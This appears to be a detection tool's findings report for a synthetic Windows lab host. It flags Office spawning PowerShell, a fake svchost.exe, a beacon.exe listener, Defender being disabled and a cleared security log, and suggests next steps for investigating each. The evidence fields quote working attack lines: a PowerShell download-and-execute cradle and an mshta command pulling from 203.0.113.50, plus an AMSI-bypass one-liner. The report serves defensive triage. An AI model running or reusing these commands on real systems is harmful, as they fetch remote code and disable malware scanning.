Title: Defender real-time protection is disabled
Evidence: AMRunningMode=Normal; AntivirusEnabled=True; RealTimeProtectionEnabled=False; BehaviorMonitorEnabled=True; IsTamperProtected=True; AntivirusSignatureLastUpdated=2026-10-07T09:00:00.000Z
Explanation: Defender is running in normal mode but real-time protection or the antivirus engine is reported as disabled. Attackers disable real-time protection to run tools undetected. It is also turned off by administrators for troubleshooting and when another product takes over, which is why passive mode is excluded.
RecommendedNextStep: Check Defender operational events 5001/5007 and Group Policy/MDM for who changed the setting and when. Confirm whether another endpoint protection product is expected.

Title: Defender event 1116: Trojan:Win32/SyntheticLab.A
Evidence: EventId=1116; TimeCreated=2026-10-16T09:22:00.000Z; Data.ThreatName=Trojan:Win32/SyntheticLab.A; Data.SeverityName=Severe; Data.CategoryName=Trojan; Data.Path=file:_C:\Users\<user:17c0d5>\AppData\Local\Temp\p.bin; Data.ProcessName=C:\Windows\System32\certutil.exe; Data.DetectionUser=WS-LAB-03\<user:17c0d5>
Explanation: A Defender malware detection (event 1116) or remediation action (event 1117) was logged within the collection window. Defender is reporting that it found or acted on something suspicious. The detection itself is reliable evidence that Defender saw the item, but it does not show whether the threat ran or persists.
RecommendedNextStep: Check whether the remediation succeeded, whether the file executed first (Sysmon, process telemetry), and look for related persistence or network findings.

Title: Security log cleared at 2026-10-16T09:27:00.000Z
Evidence: EventId=1102; TimeCreated=2026-10-16T09:27:00.000Z; Data.SubjectUserName=<user:17c0d5>; Data.SubjectDomainName=WS-LAB-03
Explanation: Security event 1102 records that the Security audit log was cleared. Clearing the Security log removes evidence and is used by attackers, but administrators also clear logs for maintenance.
RecommendedNextStep: Identify the account (SubjectUserName), the logon session and what happened just before the event. Check for forwarded copies of the log in a SIEM.

Title: WINWORD.EXE started cmd.exe (PID 6100)
Evidence: ProcessId=6100; Name=cmd.exe; ParentProcessId=6000; ParentName=WINWORD.EXE; CommandLine=cmd.exe /c powershell.exe -NoP -W Hidden -Enc VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAHMAeQBuAHQAaABlAHQAaQBjAC0AbABhAGIALQBtAGEAcgBrAGUAcgAnAA==; CreationTime=2026-10-16T08:21:00.000Z
Explanation: An Office application is the parent of cmd.exe, PowerShell, a script host, mshta, rundll32, regsvr32 or wmic. Documents that run macros or exploit the application commonly launch an interpreter. Legitimate Office add-ins and automation can also do this, so the document and user context matter.
RecommendedNextStep: Identify the document that was open, how it arrived, and the full child command line. Check recent email or download activity for the user.

Title: svchost.exe (PID 6400) is running from an unexpected path
Evidence: ProcessId=6400; ParentProcessId=6200; Name=svchost.exe; ExecutablePath=C:\Users\<user:17c0d5>\AppData\Local\Temp\svchost.exe; CommandLine=svchost.exe; ParentName=powershell.exe; CreationTime=2026-10-16T08:23:00.000Z
Explanation: A process with the name of a core Windows process (svchost.exe, lsass.exe, csrss.exe and similar) runs from a path outside System32 and SysWOW64. Malware commonly copies a trusted process name to blend in. Core processes should always run from the Windows system directories.
RecommendedNextStep: Compare the file hash with the system copy, check the signature, the parent process and the process tree.

Title: Imported alert: Suspicious PowerShell command line
Evidence: TimeCreated=2026-10-16T09:17:00.000Z; DeviceName=WS-LAB-03; AlertId=da637000000000000001_1; Title=Suspicious PowerShell command line; Severity=High; Category=Execution

Title: Defender real-time protection disabled at 2026-10-16T09:18:00.000Z
Evidence: EventId=5001; TimeCreated=2026-10-16T09:18:00.000Z; Data.ProductName=Microsoft Defender Antivirus; Data.ProductVersion=4.18.24090.11
Explanation: Defender logged event 5001 (real-time protection disabled) within the collection window. The event shows the setting was turned off at that time, whether by an administrator, a policy or a user.
RecommendedNextStep: Correlate with the logon session and process activity around the event time and with change tickets.

Title: 12 failed logons for <user:17c0d5> from 198.51.100.23 within 10 minutes
Evidence: Data.TargetUserName=<user:17c0d5>; Data.IpAddress=198.51.100.23; Data.LogonType=3; Data.Status=0xc000006d; Data.WorkstationName=KALI-LAB; Count=12; Threshold=10; WindowMinutes=10; FirstSeen=2026-10-16T09:02:00.000Z; LastSeen=2026-10-16T09:07:00.000Z
Explanation: The number of failed logons (Security 4625) for the same account name and source address within the window reaches the threshold (default 10 in 10 minutes). Password guessing and spraying produce bursts of failed logons. Mistyped passwords, stale service credentials and vulnerability scanners produce the same pattern, so the threshold, grouping and source matter.
RecommendedNextStep: Check whether any 4624 success follows from the same source, the logon type and source address, and whether the account is local or domain. Review the account lockout state.

Title: PowerShell script block 00000000-0000-0000-0000-000000000004 contains suspicious content
Evidence: TimeCreated=2026-10-16T09:21:00.000Z; Data.ScriptBlockId=00000000-0000-0000-0000-000000000004; Data.Path=; Data.ScriptBlockText=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Explanation: A PowerShell script block (event 4104) contains a download cradle, AMSI tampering strings, reflective assembly loading, VirtualAlloc, or a Defender exclusion command. Script block logging records deobfuscated script text, so these strings are meaningful. Security tools and administrators can also contain them.
RecommendedNextStep: Read the full script block (and the other parts if it was split), and identify the user, host process and parent. Review related network and file activity.

Title: beacon.exe listens on port 4444 from a user-writable path
Evidence: Protocol=TCP; LocalAddress=0.0.0.0; LocalPort=4444; OwningProcess=6700; ProcessName=beacon.exe; ProcessPath=C:\Users\<user:17c0d5>\AppData\Local\Tool\beacon.exe
Explanation: A process whose executable lives in a user-writable directory is listening on a non-loopback address. A listener outside loopback can accept connections from the network. Per-user server software (development servers, sync tools) also listens, so an unexpected owner is the signal, not the port.
RecommendedNextStep: Identify the process, its parent and start time, and whether the port is reachable from other hosts (host firewall rules). Check for matching persistence findings.

Title: mshta.exe has an established connection to 203.0.113.50:443
Evidence: Protocol=TCP; State=Established; LocalAddress=10.20.0.31; LocalPort=50123; RemoteAddress=203.0.113.50; RemotePort=443; OwningProcess=6600; ProcessName=mshta.exe; ProcessPath=C:\Windows\System32\mshta.exe
Explanation: wscript, cscript, mshta, regsvr32, rundll32, certutil or bitsadmin has an established connection to a public IP address. These binaries rarely need direct internet access in normal use, and attackers use them to fetch or run remote content. Some enterprise software legitimately drives them over the network.
RecommendedNextStep: Look up the remote address in your threat intelligence and DNS/proxy logs, find the parent process and command line, and review what the process loaded.

Title: PowerShell PID 6200 was started with an encoded command
Evidence: ProcessId=6200; ParentProcessId=6100; Name=powershell.exe; ParentName=cmd.exe; CommandLine=powershell.exe -NoP -W Hidden -Enc VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAHMAeQBuAHQAaABlAHQAaQBjAC0AbABhAGIALQBtAGEAcgBrAGUAcgAnAA==; CreationTime=2026-10-16T08:21:00.000Z
Explanation: A PowerShell process was started with -EncodedCommand (or an unambiguous abbreviation) followed by a base64 payload. Encoding hides script content from casual review and is frequently used to deliver or stage payloads. Management tools also use it to avoid quoting problems, so the command must be decoded and read.
RecommendedNextStep: Decode the payload offline (do not run it), review the parent process, and look for matching PowerShell script block events (4104).

Title: mshta.exe (PID 6600) matches a living-off-the-land pattern
Evidence: ProcessId=6600; Name=mshta.exe; ParentName=powershell.exe; CommandLine=mshta.exe http://203.0.113.50/a.hta; CreationTime=2026-10-16T08:25:00.000Z
Explanation: A command line matches a known abuse pattern for built-in binaries: certutil -urlcache, regsvr32 with a remote scriptlet, rundll32 with javascript or mshtml, mshta with a URL, bitsadmin /transfer, or wmic process call create. Attackers use signed system binaries to download or execute content. Each binary has legitimate uses, so the specific arguments are what make the pattern notable.
RecommendedNextStep: Review the full command line and URL, the parent process, and any file the command created. Check network connections for the same PID.

Title: powershell.exe (PID 6500) contains a download-and-execute pattern
Evidence: ProcessId=6500; Name=powershell.exe; ParentName=powershell.exe; CommandLine=powershell.exe -c "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.50/stage2.ps1')"; CreationTime=2026-10-16T08:24:00.000Z
Explanation: A command line contains an Invoke-Expression download cradle (IEX with DownloadString, Invoke-WebRequest or WebClient), DownloadFile/DownloadString calls, or Start-BitsTransfer from a URL. Fetching and running remote content in memory is a common first-stage technique. Software installers and administrators also use these constructs.
RecommendedNextStep: Identify the URL and the content it served (without fetching it from a production host), the parent process, and network connections for the PID.

Title: Imported event: powershell.exe on WS-LAB-03 has an encoded or download command line
Evidence: TimeCreated=2026-10-16T09:15:00.000Z; DeviceName=WS-LAB-03; AccountName=<user:17c0d5>; FileName=powershell.exe; FolderPath=C:\Windows\System32\WindowsPowerShell\v1.0; ProcessCommandLine=powershell.exe -NoP -W Hidden -Enc VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAHMAeQBuAHQAaABlAHQAaQBjAC0AbABhAGIALQBtAGEAcgBrAGUAcgAnAA==; InitiatingProcessFileName=cmd.exe
Explanation: An imported Defender XDR process event has a command line with an encoded PowerShell argument or a download-and-execute pattern. Advanced hunting exports include process command lines. The same patterns used for live data are applied to the imported rows.

Title: Defender signatures are 9 days old
Evidence: AntivirusSignatureAgeDays=9; AntivirusSignatureLastUpdated=2026-10-07T09:00:00.000Z; AMRunningMode=Normal
Explanation: Antivirus signatures are seven or more days old. Outdated signatures reduce detection of known threats. This is a hygiene signal, not evidence of an attack.
RecommendedNextStep: Check connectivity to the update source, WSUS/Intune policy, and whether the host was offline.

Title: Process beacon.exe (PID 6700) is running from a user-writable path
Evidence: ProcessId=6700; ParentProcessId=6400; Name=beacon.exe; ExecutablePath=C:\Users\<user:17c0d5>\AppData\Local\Tool\beacon.exe; CommandLine=beacon.exe --listen 4444; ParentName=svchost.exe; CreationTime=2026-10-16T08:30:00.000Z
Explanation: A running process has an executable located in a user-writable directory. Malware often executes from locations where it has write access. Many legitimate user-mode applications run from the profile as well, so the rule is intentionally low severity and low confidence and works best as context for other findings.
RecommendedNextStep: Check the file hash and signature, the parent process, the command line and network connections for the same PID. Look for the same path in persistence findings.
